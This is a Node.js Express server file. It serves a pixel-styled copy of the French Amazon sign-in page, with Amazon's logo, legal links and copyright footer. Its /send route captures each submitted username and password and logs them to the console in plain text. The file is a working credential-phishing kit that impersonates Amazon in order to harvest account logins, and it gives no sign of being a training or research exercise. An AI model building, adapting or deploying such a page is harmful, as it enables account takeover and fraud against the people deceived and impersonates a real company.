const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// FORM
app.get("/", (req, res) => {
res.send(`
<!DOCTYPE html>
<html>

<head>
<title>Formulaire</title>

<style>

body{
margin:0;
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #ffffff, #ffffff);
height:100vh;
display:flex;
flex-direction:column;
}

/* 2 sections */
.top-section{
height:66.5vh;
display:flex;
justify-content:center;
align-items:center;
}

.bottom-section{
height:44.44vh;
border-top:1px solid #b6b6b6;
display:flex;
justify-content:center;
align-items:top;
background:#fafafa;
}

.bottom-section p{
color:#555;
font-size:12px;
}

/* contenu existant */
.wrapper{
  display:flex;
  flex-direction:column;
  align-items:center;
  transform: translateY(-10px);
}

.logo img{
  width:135px;
  height:auto;
  margin-bottom:50px;

  filter: saturate(10) contrast(2) brightness(1.2);
}

.container{
  background:white;
  padding:25px;
  padding-top:2px;
  border-radius:9px;
  width:300px;
  height:40vh;
  border:1px solid #d5d9d9;
  box-shadow:none;
  text-align:left;
  margin-top: -40px;
}

.footer p{
position: relative;
padding-bottom: 10px;
}

.container h4{
position: relative;
padding-top: 25px;
}

.container h4::after{
content: "";
position: absolute;
left: 0;
right: 0;
top: 0;
height: 1px;
background: #e0e0e0;
}


h2{
font-size:20px;
font-weight:normal;
margin-bottom:20px;
color:#333;
}

.top-section h3{
font-size:14px;
font-weight:600;
}

.top-section a{
color: #3a6ea5;
}

.top-section h4{
font-size:14px;
font-weight:400;
max-width:300;
}

.top-section a h4{
text-decoration: none;
}

a:hover{
color: #000000;
}

input{
width:90%;
padding:10px;
margin-top:5px;
border:1px solid #ddd;
border-radius:8px;
outline:none;
transition:0.2s;
transform: translateY(-6px);
}

input:focus{
border-color:#586ff2;
box-shadow:0 0 1px #FFCE12;
}

button{
width:100%;
padding:8px;
margin-top:6px;
background:#FFCE12;
filter: brightness(1.05);
color:black;
border:none;
border-radius:20px;
cursor:pointer;
font-weight:500;
letter-spacing:0.8px;
transition:0.2s;
}

button:hover{
background:#FFCE12;
filter: contrast(0.95) brightness(0.99);
}

.footer{
margin-top:15px;
margin-left:-5;
max-width:290px;
font-size:12px;
color:black;
}

.footer h4 a{
text-decoration: none;
font-weight:500;
}

.secondary-btn{
display:block;
width: 340px;      
margin-top: 2px;
padding: 7px;
background: white;
color:black;
border: 1px solid #929292;
border-radius: 20px;
cursor: pointer;
letter-spacing:0.1;
text-align:center;
text-decoration:none;
font-weight: 500;
transition: 0.2s;
transform: translateY(4px);
}

.secondary-btn:hover{
background: #f1f1f1;
}

a.secondary-btn{
  color:black;
  text-decoration:none;
}

.separator{
width: 350px;
display: flex;
align-items: center;
margin: 15px 0;
color: #767676;
font-size: 11.5px;
transform: translateY(10px);
}

.separator::before,
.separator::after{
content: "";
flex: 1;
height: 1px;
background: #d5d9d9;
}

.separator span{
padding: 0 10px;
}

</style>
</head>

<body>

<div class="top-section">

  <div class="wrapper">

    <div class="logo">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbmdZn1ZFwtk1ibp75fmU1zaBGF8YLgJ3jLA&s" alt="Logo">
    </div>

    <div class="container">

      <h2>S'identifier</h2>
      <h3>Saisissez un numéro de téléphone mobile ou votre adresse e-mail</h3>

      <form method="POST" action="/send">

        <input name="username" placeholder="Téléphone ou adresse e-mail" required />
        <input type="password" name="password" placeholder="Mot de passe" required />

        <button type="submit">Continuer</button>
      </form>

      <div class="footer">
      <p>
        En continuant, vous acceptez les
        <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?nodeId=GLSBYFE9MGKKQXXM&ie=UTF8&ref_=ap_signin_notification_condition_of_use">conditions d'utilisation et de vente</a>.
        d'Amazon. Consultez notre
        <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?nodeId=GX7NJQ4ZB8MHFRNJ&ie=UTF8&ref_=ap_signin_notification_privacy_notice">déclaration de confidentialité</a>
        , notre
        <a href="https://www.amazon.fr/gp/help/customer/display.html/?nodeId=GVASXV5UZ64R4Y25"> politique relative aux cookies</a>
        ainsi que notre
        <a href="https://www.amazon.fr/gp/help/customer/display.html?nodeId=G64JFZVFDY66XG9K">politique relative aux publicités ciblées par centres d'intérêts.</a>
      </p> 

      <h4> 
        <a href="https://www.amazon.fr/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">Vous avez besoin d'aide pour vous identifier ?</a>
      </h4>

      </div>

    </div>
  <div class="separator">
    <span>Nouveau chez Amazon ?</span>
  </div>
  <a href="https://www.amazon.fr/ap/register?openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3F%26tag%3Dhydraamazon05-21%26ref%3Dnav_signin%26adgrpid%3D154637622122%26hvpone%3D%26hvptwo%3D%26hvadid%3D683560492550%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D3185657194183930010%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D9056101%26hvtargid%3Dkwd-10573980%26hydadcr%3D&prevRID=HNX7KK13CTXQVMQKJJT8&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&prepopulatedLoginId=&failedSignInCount=0&webAuthnChallengeIdForAutofill=fGLJhWDlLgK7Csm5EGEHif0vXmCfwS2G%3AEU&webAuthnGetParametersForAutofill=eyJycElkIjoiYW1hem9uLmZyIiwiY2hhbGxlbmdlIjoiZkdMSmhXRGxMZ0s3Q3NtNUVHRUhpZjB2WG1DZndTMkciLCJ0aW1lb3V0IjozMjQ0NDEsIm1lZGlhdGlvbiI6ImNvbmRpdGlvbmFsIiwidXNlclZlcmlmaWNhdGlvbiI6InByZWZlcnJlZCJ9&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=frflex&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="secondary-btn">
  Créer votre compte Amazon
  </a>


  </div>

</div>

</div>

<div class="bottom-section">
  <p>© 1996-2026, Amazon.com Inc. ou ses affiliés</p>
</div>

</body>
</html>
`);
});

// RECEIVE
app.post("/send", (req, res) => {

console.log("BODY:", req.body);
console.log("USERNAME:", req.body.username);
console.log("PASSWORD:", req.body.password);

res.send("OK reçu");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
console.log("Server running on port " + PORT);
});